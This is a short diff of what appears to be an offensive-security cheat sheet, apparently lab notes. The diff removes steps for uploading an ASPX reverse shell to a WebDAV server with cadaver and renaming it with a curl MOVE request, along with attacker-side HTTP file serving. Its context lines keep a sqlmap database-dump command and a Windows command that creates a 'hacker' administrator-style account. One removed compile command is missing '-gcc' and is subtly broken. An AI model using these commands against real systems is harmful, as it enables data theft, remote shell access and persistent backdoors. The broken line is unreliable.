@@ -90,37 +90,7 @@ sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dump -D cscart -T
 
 ## PRIVILAGE ESCALATION
 
-### C Compile
 
-linux:
-> gcc -o hello hello.c
-
-windows 32 bit:
-> i686-w64-mingw32-gcc -o hello.exe hello.c
-
-windows 64 bit:
-> x86_64-w64-mingw32 -o hello.exe hello.c
-
-### File Transfer
-
-Attacker machine
-
-> python -m SimpleHTTPServer 8000
-
-> python3 -m http.server 8000
-
-Cadaver
-
-```
-cadaver http://10.11.1.13/scripts/
-put /root/Desktop/shellLER/phpReverseShell/aspunstage.aspx
-```
-
-CURL
-
-```
-curl -X MOVE --header    "Destination:http://10.11.1.13/scripts/aspunstaged.asp" "http://10.11.1.13/scripts/aspunstaged.aspx"
-```
 
 Windows Commands:
 > net user hacker hacker /add 
